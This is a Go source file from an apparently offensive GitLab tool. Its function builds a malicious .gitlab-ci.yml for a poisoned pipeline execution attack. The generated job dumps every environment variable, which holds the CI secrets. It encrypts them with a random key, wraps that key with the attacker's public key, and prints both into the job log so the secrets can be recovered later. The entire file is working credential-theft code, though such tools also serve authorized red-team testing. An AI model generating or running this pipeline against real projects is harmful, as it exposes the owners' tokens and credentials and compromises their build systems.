// pkg/gitlab/attacks/secretsdump/pipeline.go
package secretsdump

import (
	"gopkg.in/yaml.v3"
)

// GeneratePipelineYAML creates a malicious .gitlab-ci.yml that exfiltrates secrets
// via encrypted pipeline execution (PPE attack)
func GeneratePipelineYAML(publicKeyPEM string) string {
	pipeline := map[string]interface{}{
		"variables": map[string]string{
			"KEY": publicKeyPEM,
		},
		"stages": []string{
			"build",
		},
		"default": map[string]string{
			"image": "alpine",
		},
		"build_job": map[string]interface{}{
			"stage": "build",
			"script": []string{
				// Install OpenSSL (alpine: apk, debian/ubuntu: apt-get)
				"apk add openssl || apt-get install -y openssl || true",

				// Generate random 24-byte symmetric key
				"openssl rand -base64 24 | tr -d '\\n' > sym.key",

				// Decode public key to file (avoid process substitution)
				"echo $KEY | base64 -d > pubkey.pem",

				// All encryption commands in ONE line to ensure atomic output in logs
				"echo -n '$'; cat sym.key | openssl pkeyutl -encrypt -pubin -inkey pubkey.pem | base64 -w 0; echo -n '$'; env | openssl enc -aes-256-cbc -kfile sym.key -pbkdf2 | base64 -w 0; echo '$'",
			},
		},
	}

	yamlBytes, _ := yaml.Marshal(pipeline)
	return string(yamlBytes)
}
